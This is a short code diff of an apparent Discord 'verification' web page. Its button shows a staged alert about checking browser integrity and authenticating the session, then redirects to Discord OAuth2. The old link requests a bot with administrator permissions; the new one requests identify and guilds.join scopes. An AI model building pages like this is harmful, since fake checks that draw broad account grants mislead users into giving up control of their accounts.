@@ -90,8 +90,9 @@
         function startVerify() {
             // Placeholder for backend integration
             alert("Step 1: Checking browser integrity...\nStep 2: Authenticating Discord Session...");
-            window.location.href = "https://discord.com/oauth2/authorize?client_id=1473370534275453071&permissions=8&integration_type=0&scope=bot+applications.commands"; // Put your OAuth2 link here
+            window.location.href = "https://discord.com/oauth2/authorize?client_id=1473370534275453071&response_type=code&redirect_uri=http%3A%2F%2Flocalhost%3A5000%2Fcallback&scope=identify+guilds.join"; // Put your OAuth2 link here
         }
     </script>
 </body>
+
 </html>
